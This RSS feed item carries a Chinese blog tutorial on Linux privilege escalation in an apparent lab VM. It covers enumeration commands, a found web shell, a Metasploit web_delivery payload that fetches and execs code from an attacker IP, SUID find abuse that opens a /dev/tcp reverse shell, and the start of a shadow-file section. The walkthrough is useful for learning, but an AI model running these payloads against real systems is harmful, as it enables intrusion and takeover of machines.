<?xml version="1.0"?>
<rss version="2.0">
    <channel>
        <title>云逸&#39;bolg • Posts by &#34;内网安全&#34; category</title>
        <link>http://gyzero.shop</link>
        <description></description>
        <language>zh-CN</language>
        <pubDate>Fri, 10 Nov 2023 17:52:23 +0800</pubDate>
        <lastBuildDate>Fri, 10 Nov 2023 17:52:23 +0800</lastBuildDate>
        <item>
            <guid isPermalink="true">http://gyzero.shop/2023/11/10/network-security/neiwang/linux%E6%8F%90%E6%9D%83/linux%E6%8F%90%E6%9D%83/</guid>
            <title>linux提权</title>
            <link>http://gyzero.shop/2023/11/10/network-security/neiwang/linux%E6%8F%90%E6%9D%83/linux%E6%8F%90%E6%9D%83/</link>
            <pubDate>Fri, 10 Nov 2023 17:52:23 +0800</pubDate>
            <description><![CDATA[ &lt;h3 id=&#34;信息收集命令&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#信息收集命令&#34;&gt;#&lt;/a&gt; 信息收集命令&lt;/h3&gt;
&lt;h4 id=&#34;系统信息&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#系统信息&#34;&gt;#&lt;/a&gt; 系统信息&lt;/h4&gt;
&lt;ul&gt;
&lt;li&gt;&lt;strong&gt; &lt;code&gt;uname -a&lt;/code&gt; &lt;/strong&gt;: 显示内核、操作系统和 CPU 信息。&lt;/li&gt;
&lt;li&gt;&lt;strong&gt; &lt;code&gt;head -n 1 /etc/issue&lt;/code&gt; &lt;/strong&gt;: 显示操作系统版本。&lt;/li&gt;
&lt;li&gt;&lt;strong&gt; &lt;code&gt;cat /proc/version&lt;/code&gt; &lt;/strong&gt;: 显示系统信息。&lt;/li&gt;
&lt;li&gt;&lt;strong&gt; &lt;code&gt;hostname&lt;/code&gt; &lt;/strong&gt;: 显示计算机名。&lt;/li&gt;
&lt;li&gt;&lt;strong&gt; &lt;code&gt;env&lt;/code&gt; &lt;/strong&gt;: 显示环境变量。&lt;/li&gt;
&lt;/ul&gt;
&lt;h4 id=&#34;网络信息&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#网络信息&#34;&gt;#&lt;/a&gt; 网络信息&lt;/h4&gt;
&lt;ul&gt;
&lt;li&gt;&lt;strong&gt; &lt;code&gt;ifconfig&lt;/code&gt; &lt;/strong&gt;: 显示网络接口信息（现在更常用的是 &lt;code&gt;ip addr show&lt;/code&gt; ）。&lt;/li&gt;
&lt;li&gt;&lt;strong&gt; &lt;code&gt;netstat -lntp&lt;/code&gt; &lt;/strong&gt;: 显示所有监听端口。&lt;/li&gt;
&lt;li&gt;&lt;strong&gt; &lt;code&gt;netstat -antp&lt;/code&gt; &lt;/strong&gt;: 显示所有已建立的连接。&lt;/li&gt;
&lt;li&gt;&lt;strong&gt; &lt;code&gt;netstat -s&lt;/code&gt; &lt;/strong&gt;: 显示网络统计信息。&lt;/li&gt;
&lt;li&gt;&lt;strong&gt; &lt;code&gt;iptables -L&lt;/code&gt; &lt;/strong&gt;: 显示防火墙设置。&lt;/li&gt;
&lt;li&gt;&lt;strong&gt; &lt;code&gt;route -n&lt;/code&gt; &lt;/strong&gt;: 显示路由表。&lt;/li&gt;
&lt;/ul&gt;
&lt;h4 id=&#34;用户组信息系统服务&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#用户组信息系统服务&#34;&gt;#&lt;/a&gt; 用户组信息系统服务&lt;/h4&gt;
&lt;ul&gt;
&lt;li&gt;&lt;strong&gt; &lt;code&gt;w&lt;/code&gt; &lt;/strong&gt;：显示活动用户和他们正在使用的终端等信息。&lt;/li&gt;
&lt;li&gt;&lt;strong&gt; &lt;code&gt;id [username]&lt;/code&gt; &lt;/strong&gt;：显示指定用户的信息，包括用户 ID（UID）、所属用户组等。&lt;/li&gt;
&lt;li&gt;&lt;strong&gt; &lt;code&gt;last&lt;/code&gt; &lt;/strong&gt;：显示用户登录的历史记录，包括登录时间和来源。&lt;/li&gt;
&lt;li&gt;&lt;strong&gt; &lt;code&gt;cut -d: -f1 /etc/passwd&lt;/code&gt; &lt;/strong&gt;：显示系统上所有用户的用户名。&lt;/li&gt;
&lt;li&gt;&lt;strong&gt; &lt;code&gt;cut -d: -f1 /etc/group&lt;/code&gt; &lt;/strong&gt;：显示系统上所有组的组名。&lt;/li&gt;
&lt;li&gt;&lt;strong&gt; &lt;code&gt;crontab -l&lt;/code&gt; &lt;/strong&gt;：显示当前用户的计划任务（定时任务）。&lt;/li&gt;
&lt;li&gt;&lt;strong&gt; &lt;code&gt;chkconfig --list&lt;/code&gt; &lt;/strong&gt;：列出所有系统服务。&lt;/li&gt;
&lt;li&gt;&lt;strong&gt; &lt;code&gt;chkconfig --list | grep on&lt;/code&gt; &lt;/strong&gt;：列出所有已启动的系统服务。&lt;/li&gt;
&lt;li&gt;&lt;strong&gt; &lt;code&gt;echo $PATH&lt;/code&gt; &lt;/strong&gt;：显示系统的路径列表，用冒号分隔的目录列表表示系统在搜索可执行文件时的顺序。&lt;/li&gt;
&lt;/ul&gt;
&lt;h4 id=&#34;信息收集&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#信息收集&#34;&gt;#&lt;/a&gt; 信息收集&lt;/h4&gt;
&lt;p&gt;&lt;code&gt;nmap -sT 192.168.244.0/24&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;https://tuchuang-1309689803.cos.ap-nanjing.myqcloud.com/linux%E6%8F%90%E6%9D%83/image-20231121190515553.png&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
&lt;p&gt;访问 80 没啥东西扫一下目录&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;https://tuchuang-1309689803.cos.ap-nanjing.myqcloud.com/linux%E6%8F%90%E6%9D%83/image-20231121190852090.png&#34; alt=&#34;image-20231121190852090&#34;&gt;&lt;/p&gt;
&lt;p&gt;扫到一个 shell.php&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;https://tuchuang-1309689803.cos.ap-nanjing.myqcloud.com/linux%E6%8F%90%E6%9D%83/image-20231121191144694.png&#34; alt=&#34;image-20231121191144694&#34;&gt;&lt;/p&gt;
&lt;h4 id=&#34;反弹shell&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#反弹shell&#34;&gt;#&lt;/a&gt; 反弹 shell&lt;/h4&gt;
&lt;p&gt;参数是 cmd 可以执行命令&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;https://tuchuang-1309689803.cos.ap-nanjing.myqcloud.com/linux%E6%8F%90%E6%9D%83/image-20231121191211218.png&#34; alt=&#34;image-20231121191211218&#34;&gt;&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;https://tuchuang-1309689803.cos.ap-nanjing.myqcloud.com/linux%E6%8F%90%E6%9D%83/image-20231121191300474.png&#34; alt=&#34;image-20231121191300474&#34;&gt;&lt;/p&gt;
&lt;p&gt;&lt;code&gt;msf script/web_delivery模块 反弹shell&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;&lt;code&gt;use exploit/multi/script/web_delivery &lt;/code&gt;&lt;/p&gt;
&lt;p&gt;&lt;code&gt;set lhost 192.168.244.128&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;&lt;code&gt;set lport 9000&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;&lt;code&gt;run&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;https://tuchuang-1309689803.cos.ap-nanjing.myqcloud.com/linux%E6%8F%90%E6%9D%83/image-20231121191557311.png&#34; alt=&#34;image-20231121191557311&#34;&gt;&lt;/p&gt;
&lt;p&gt;复制 payload 并且 url 编码添加在 cmd 参数后面执行得到 shell&lt;/p&gt;
&lt;p&gt;&lt;code&gt;python%20-c%20%22import%20sys%3Bimport%20ssl%3Bu%3D__import__(&#39;urllib&#39;%2B%7B2%3A&#39;&#39;%2C3%3A&#39;.request&#39;%7D%5Bsys.version_info%5B0%5D%5D%2Cfromlist%3D(&#39;urlopen&#39;%2C))%3Br%3Du.urlopen(&#39;http%3A%2F%2F192.168.244.128%3A8080%2FsZTvRL2bM&#39;%2C%20context%3Dssl._create_unverified_context())%3Bexec(r.read())%3B%22&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;https://tuchuang-1309689803.cos.ap-nanjing.myqcloud.com/linux%E6%8F%90%E6%9D%83/image-20231121191810361.png&#34; alt=&#34;image-20231121191810361&#34;&gt;&lt;/p&gt;
&lt;h4 id=&#34;主机信息收集&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#主机信息收集&#34;&gt;#&lt;/a&gt; 主机信息收集&lt;/h4&gt;
&lt;p&gt;先拿一个交互 shell&lt;/p&gt;
&lt;p&gt;&lt;code&gt;**python -c &#39;import pty;pty.spawn(&amp;quot;/bin/bash&amp;quot;)&#39;**&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;https://tuchuang-1309689803.cos.ap-nanjing.myqcloud.com/linux%E6%8F%90%E6%9D%83/image-20231121192112964.png&#34; alt=&#34;image-20231121192112964&#34;&gt;&lt;/p&gt;
&lt;figure class=&#34;highlight python&#34;&gt;&lt;figcaption data-lang=&#34;python&#34;&gt;&lt;/figcaption&gt;&lt;table&gt;&lt;tr&gt;&lt;td data-num=&#34;1&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;显示内核、操作系统和CPU信息&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;2&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;Linux osboxes &lt;span class=&#34;token number&#34;&gt;4.15&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;.0&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;-&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;45&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;-&lt;/span&gt;generic &lt;span class=&#34;token comment&#34;&gt;#48-Ubuntu SMP Tue Jan 29 16:28:13 UTC 2019 x86_64 x86_64 x86_64 GNU/Linux&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;3&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;操作系统版本&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;4&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;Linux Lite &lt;span class=&#34;token number&#34;&gt;4.4&lt;/span&gt; LTS \n \l&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;5&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;显示系统信息&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;6&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;Linux version &lt;span class=&#34;token number&#34;&gt;4.15&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;.0&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;-&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;45&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;-&lt;/span&gt;generic &lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;buildd@lgw01&lt;span class=&#34;token operator&#34;&gt;-&lt;/span&gt;amd64&lt;span class=&#34;token operator&#34;&gt;-&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;031&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;gcc version &lt;span class=&#34;token number&#34;&gt;7.3&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;.0&lt;/span&gt; &lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;Ubuntu &lt;span class=&#34;token number&#34;&gt;7.3&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;.0&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;-&lt;/span&gt;16ubuntu3&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;token comment&#34;&gt;#48-Ubuntu SMP Tue Jan 29 16:28:13 UTC 2019&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;7&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;环境变量&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;8&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;env&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;9&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;APACHE_LOG_DIR&lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;/&lt;/span&gt;var&lt;span class=&#34;token operator&#34;&gt;/&lt;/span&gt;log&lt;span class=&#34;token operator&#34;&gt;/&lt;/span&gt;apache2&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;10&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;LANG&lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt;C&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;11&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;INVOCATION_ID&lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt;15ecc432bc2940368927675d4ac3a3a3&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;12&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;APACHE_LOCK_DIR&lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;/&lt;/span&gt;var&lt;span class=&#34;token operator&#34;&gt;/&lt;/span&gt;lock&lt;span class=&#34;token operator&#34;&gt;/&lt;/span&gt;apache2&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;13&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;PWD&lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;/&lt;/span&gt;var&lt;span class=&#34;token operator&#34;&gt;/&lt;/span&gt;www&lt;span class=&#34;token operator&#34;&gt;/&lt;/span&gt;html&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;14&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;JOURNAL_STREAM&lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;9&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;:&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;21980&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;15&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;APACHE_RUN_GROUP&lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt;user6&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;16&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;APACHE_RUN_DIR&lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;/&lt;/span&gt;var&lt;span class=&#34;token operator&#34;&gt;/&lt;/span&gt;run&lt;span class=&#34;token operator&#34;&gt;/&lt;/span&gt;apache2&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;17&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;APACHE_RUN_USER&lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt;user6&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;18&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;APACHE_PID_FILE&lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;/&lt;/span&gt;var&lt;span class=&#34;token operator&#34;&gt;/&lt;/span&gt;run&lt;span class=&#34;token operator&#34;&gt;/&lt;/span&gt;apache2&lt;span class=&#34;token operator&#34;&gt;/&lt;/span&gt;apache2&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;pid&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;19&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;SHLVL&lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;1&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;20&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;PATH&lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;/&lt;/span&gt;usr&lt;span class=&#34;token operator&#34;&gt;/&lt;/span&gt;local&lt;span class=&#34;token operator&#34;&gt;/&lt;/span&gt;sbin&lt;span class=&#34;token punctuation&#34;&gt;:&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;/&lt;/span&gt;usr&lt;span class=&#34;token operator&#34;&gt;/&lt;/span&gt;local&lt;span class=&#34;token operator&#34;&gt;/&lt;/span&gt;&lt;span class=&#34;token builtin&#34;&gt;bin&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;:&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;/&lt;/span&gt;usr&lt;span class=&#34;token operator&#34;&gt;/&lt;/span&gt;sbin&lt;span class=&#34;token punctuation&#34;&gt;:&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;/&lt;/span&gt;usr&lt;span class=&#34;token operator&#34;&gt;/&lt;/span&gt;&lt;span class=&#34;token builtin&#34;&gt;bin&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;:&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;/&lt;/span&gt;sbin&lt;span class=&#34;token punctuation&#34;&gt;:&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;/&lt;/span&gt;&lt;span class=&#34;token builtin&#34;&gt;bin&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;21&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;_&lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;/&lt;/span&gt;usr&lt;span class=&#34;token operator&#34;&gt;/&lt;/span&gt;&lt;span class=&#34;token builtin&#34;&gt;bin&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;/&lt;/span&gt;env&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;22&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;计算机名&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;23&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;osboxes&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;24&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;系统路径列表&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;25&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token operator&#34;&gt;/&lt;/span&gt;usr&lt;span class=&#34;token operator&#34;&gt;/&lt;/span&gt;local&lt;span class=&#34;token operator&#34;&gt;/&lt;/span&gt;sbin&lt;span class=&#34;token punctuation&#34;&gt;:&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;/&lt;/span&gt;usr&lt;span class=&#34;token operator&#34;&gt;/&lt;/span&gt;local&lt;span class=&#34;token operator&#34;&gt;/&lt;/span&gt;&lt;span class=&#34;token builtin&#34;&gt;bin&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;:&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;/&lt;/span&gt;usr&lt;span class=&#34;token operator&#34;&gt;/&lt;/span&gt;sbin&lt;span class=&#34;token punctuation&#34;&gt;:&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;/&lt;/span&gt;usr&lt;span class=&#34;token operator&#34;&gt;/&lt;/span&gt;&lt;span class=&#34;token builtin&#34;&gt;bin&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;:&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;/&lt;/span&gt;sbin&lt;span class=&#34;token punctuation&#34;&gt;:&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;/&lt;/span&gt;&lt;span class=&#34;token builtin&#34;&gt;bin&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;26&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;开启的服务&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;27&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;mysql 开启&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;28&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;用户&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;29&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;vboxadd&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;30&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;user1&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;31&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;user2&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;32&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;user3&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;33&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;user4&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;34&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;statd&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;35&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;user5&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;36&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;user6&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;37&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;mysql&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;38&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;user7&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;39&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;user8&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;h4 id=&#34;suid提权&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#suid提权&#34;&gt;#&lt;/a&gt; suid 提权&lt;/h4&gt;
&lt;p&gt;SUID（Set User ID）是一种权限设置，允许用户以文件所有者的权限来执行文件，即使用户自身的权限可能不足以执行该文件。&lt;/p&gt;
&lt;p&gt;在 Unix 或类 Unix 系统中，当一个可执行文件的 SUID 位被设置为 1 时，无论谁执行该文件，都会以该文件的所有者身份执行。这种权限设置通常用于系统文件或程序，以便允许普通用户执行特定的任务或命令，而无需暴露超出其权限范围的访问权限。&lt;/p&gt;
&lt;p&gt;&lt;code&gt;find / -perm -u=s -type f 2&amp;gt;/dev/null find / -user root -perm -4000-print2&amp;gt;/dev/null find / -user root -perm -4000-exec ls -ldb &amp;#123;&amp;#125; \;&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;在 Unix 或 Linux 系统中查找具有 SUID 权限设置的文件。它会搜索整个文件系统 (“/”)，找到具有 SUID 权限设置的文件 (“-perm  -u=s”) 并将它们显示出来。同时，将任何错误消息重定向到 /dev/null，以避免它们显示在屏幕上。&lt;/p&gt;
&lt;p&gt;常见的提权文件&lt;/p&gt;
&lt;p&gt;&lt;code&gt;nmap、vim、find、more、less、bash、cp、Nano、mv、awk、man、weget&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;查询到有一个 find&lt;/p&gt;
&lt;p&gt;cd /  cd /tmp 到 tmp 目录&lt;/p&gt;
&lt;p&gt;创建一个文件&lt;/p&gt;
&lt;p&gt;touch 1234&lt;/p&gt;
&lt;p&gt;find 1234 -exec whoami ;&lt;/p&gt;
&lt;p&gt;这个命令的作用是在当前目录下搜索名为 “1234” 的文件或目录，并对找到的每一个执行  &lt;code&gt;whoami&lt;/code&gt;  命令。&lt;/p&gt;
&lt;p&gt;&lt;code&gt;find&lt;/code&gt;  命令用于查找文件和目录， &lt;code&gt;-exec&lt;/code&gt;  选项允许在找到的每一个项目上执行特定的命令， &lt;code&gt;\;&lt;/code&gt;  表示命令结束。&lt;/p&gt;
&lt;p&gt;如果在当前目录下存在名为 “1234” 的文件或目录，对于每一个找到的 “1234”， &lt;code&gt;whoami&lt;/code&gt;  命令将被执行，显示当前执行命令的用户的用户名。&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;https://tuchuang-1309689803.cos.ap-nanjing.myqcloud.com/linux%E6%8F%90%E6%9D%83/image-20240207132333459.png&#34; alt=&#34;image-20240207132333459&#34;&gt;&lt;/p&gt;
&lt;p&gt;反弹 shell&lt;/p&gt;
&lt;p&gt;&lt;code&gt;find /etc/passwd -exec bash -ip &amp;gt;&amp;amp; /dev/tcp/192.168.244.128/4343 0&amp;gt;&amp;amp;1 \;&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;nc 开启监听接收到会话&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;https://tuchuang-1309689803.cos.ap-nanjing.myqcloud.com/linux%E6%8F%90%E6%9D%83/image-20240207132540518.png&#34; alt=&#34;image-20240207132540518&#34;&gt;&lt;/p&gt;
&lt;h4 id=&#34;可读shadow文件利用&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#可读shadow文件利用&#34;&gt;#&lt;/a&gt; 可读 shadow 文件利用&lt;/h4&gt;
&lt;p&gt;Shadow 文件的概述:&lt;/p&gt;
&lt;p&gt;Shadow 文件是一个 Linux 系统中存储加密用户密码和其他身份信息，如账号过期时间，密码过期时间，账户锁定和密码最小长度等等的重要文件。&lt;/p&gt;
&lt;p&gt;Shadow 文件位于 /etc/shadow ，只有 root 用户有权限访问它。&lt;/p&gt;
&lt;p&gt;shadow 文件与 passwd 文件的关系：早些版本加密后的密码是保存在 passwd 文件里第二个字段的位置也就是图中 x 的位置&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;https://tuchuang-1309689803.cos.ap-nanjing.myqcloud.com/linux%E6%8F%90%E6%9D%83/image-20240221212919749.png&#34; alt=&#34;image-20240221212919749&#34;&gt;&lt;/p&gt;
&lt;p&gt;但是呢虽然是加密的还是有可能被破解所以加上了 shadow 这个文件而 passwd 文件里的就被替换为了 X 占位，因为 shadow 文件只有 root 用户可以访问所以相对比较安全，不过有时管理员对文件权限错误配置也会导致被拿来恶意利用&lt;/p&gt;
&lt;p&gt;文件格式：&lt;/p&gt;
